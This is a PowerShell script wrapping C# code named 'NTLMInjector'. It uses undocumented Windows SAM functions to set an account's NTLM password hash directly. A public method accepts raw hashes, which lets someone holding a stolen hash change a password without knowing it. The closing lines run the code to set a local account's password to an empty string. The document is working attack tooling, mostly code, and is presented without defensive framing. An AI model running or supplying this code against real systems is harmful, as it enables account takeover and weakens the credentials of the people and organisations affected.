$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Security.Principal;
using System.ComponentModel;

namespace NTLMInjector
{
	public class SetNTLM
	{
		[DllImport("samlib.dll")]
		static extern int SamConnect(ref UNICODE_STRING serverName, out IntPtr ServerHandle, int DesiredAccess, bool reserved);

		[DllImport("samlib.dll")]
		static extern int SamConnect(IntPtr server, out IntPtr ServerHandle, int DesiredAccess, bool reserved);

		[DllImport("samlib.dll")]
		static extern int SamCloseHandle(IntPtr SamHandle);

		[DllImport("samlib.dll")]
		static extern int SamOpenDomain(IntPtr ServerHandle, int DesiredAccess, byte[] DomainId, out IntPtr DomainHandle);
		
		[DllImport("samlib.dll")]
		static extern int SamOpenUser(IntPtr DomainHandle, int DesiredAccess, int UserId, out IntPtr UserHandle);

        [DllImport("samlib.dll")]
        static extern int SamiChangePasswordUser(IntPtr UserHandle, bool isOldLM, byte[] oldLM, byte[] newLM, 
                                                                    bool isNewNTLM, byte[] oldNTLM, byte[] newNTLM);

        [DllImport("advapi32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern uint SystemFunction007(ref UNICODE_STRING dataToHash, [In, MarshalAs(UnmanagedType.LPArray)] byte[] hash);
        
		const int MAXIMUM_ALLOWED = 0x02000000;


		[StructLayout(LayoutKind.Sequential)]
		struct UNICODE_STRING : IDisposable
		{
			public ushort Length;
			public ushort MaximumLength;
			private IntPtr buffer;

			[SecurityPermission(SecurityAction.LinkDemand)]
			public void Initialize(string s)
			{
				Length = (ushort)(s.Length * 2);
				MaximumLength = (ushort)(Length + 2);
				buffer = Marshal.StringToHGlobalUni(s);
			}

			public void Dispose()
			{
				if (buffer != IntPtr.Zero)
					Marshal.FreeHGlobal(buffer);
				buffer = IntPtr.Zero;
			}
			public override string ToString()
			{
				if (Length == 0)
					return String.Empty;
				return Marshal.PtrToStringUni(buffer, Length / 2);
			}
		}

		static int GetRidFromSid(SecurityIdentifier sid)
		{
			string sidstring = sid.Value;
			int pos = sidstring.LastIndexOf('-');
			string rid = sidstring.Substring(pos + 1);
			return int.Parse(rid);
		}

        [SecurityPermission(SecurityAction.Demand)]
        public static byte[] computeNTLMHash(string password)
        {
            byte[] hash = new byte[16];
            UNICODE_STRING us = new UNICODE_STRING();
            us.Initialize(password);
            uint retcode = SystemFunction007(ref us, hash);
            if (retcode != 0)
            {
                throw new Win32Exception((int)retcode);
            }
            return hash;
        }
        
		[SecurityPermission(SecurityAction.Demand)]
		public static int SetNTLMHash(string server, SecurityIdentifier account, byte[] PreviousNTLM, byte[] NewNTLM)
		{
			IntPtr SamHandle = IntPtr.Zero;
			IntPtr DomainHandle = IntPtr.Zero;
			IntPtr UserHandle = IntPtr.Zero;
			int Status = 0;
			UNICODE_STRING ustr_server = new UNICODE_STRING();
			try
			{
				if (String.IsNullOrEmpty(server))
				{
					Status = SamConnect(IntPtr.Zero, out SamHandle, MAXIMUM_ALLOWED, false);
				}
				else
				{
					ustr_server.Initialize(server);
					Status = SamConnect(ref ustr_server, out SamHandle, MAXIMUM_ALLOWED, false);
				}
				if (Status != 0)
				{
					Console.WriteLine("SamrConnect failed {0}", Status.ToString("x"));
					return Status;
				}
				Console.WriteLine("SamConnect OK");
				byte[] sid = new byte[SecurityIdentifier.MaxBinaryLength];
				account.AccountDomainSid.GetBinaryForm(sid, 0);
				Status = SamOpenDomain(SamHandle, MAXIMUM_ALLOWED, sid, out DomainHandle);
				if (Status != 0)
				{
					Console.WriteLine("SamrOpenDomain failed {0}", Status.ToString("x"));
					return Status;
				}
				Console.WriteLine("SamrOpenDomain OK");
				int rid = GetRidFromSid(account);
				Console.WriteLine("rid is " + rid);
				Status = SamOpenUser(DomainHandle , MAXIMUM_ALLOWED , rid , out UserHandle);
				if (Status != 0)
				{
					Console.WriteLine("SamrOpenUser failed {0}", Status.ToString("x"));
					return Status;
				}
				Console.WriteLine("SamOpenUser OK");
                byte[] oldLm = new byte[16];
                byte[] newLm = new byte[16];
				Status = SamiChangePasswordUser(UserHandle, false, oldLm, newLm, true, PreviousNTLM, NewNTLM);
				if (Status != 0)
				{
					Console.WriteLine("SamiChangePasswordUser failed {0}", Status.ToString("x"));
					return Status;
				}
				Console.WriteLine("SamiChangePasswordUser OK");
			}
			finally
			{
				if (UserHandle != IntPtr.Zero)
					SamCloseHandle(UserHandle);
				if (DomainHandle != IntPtr.Zero)
					SamCloseHandle(DomainHandle);
				if (SamHandle != IntPtr.Zero)
					SamCloseHandle(SamHandle);
				ustr_server.Dispose();
			}
			Console.WriteLine("OK");
			return 0;
		}
        
        public static int ChangePassword(string server, SecurityIdentifier account, string oldpassword, string newpassword)
        {
            byte[] oldNTLM = computeNTLMHash(oldpassword);
            byte[] newNTLM = computeNTLMHash(newpassword);
            return SetNTLMHash(server, account, oldNTLM, newNTLM);
        }
	}

}

"@
Add-Type -TypeDefinition $Source

[System.Security.Principal.NTAccount]$objUser = New-Object System.Security.Principal.NTAccount("test", "test")
[System.Security.Principal.SecurityIdentifier] $objSID = $objUser.Translate([System.Security.Principal.SecurityIdentifier]) 

[NTLMInjector.SetNTLM]::ChangePassword($null, $objSID, "test", "")
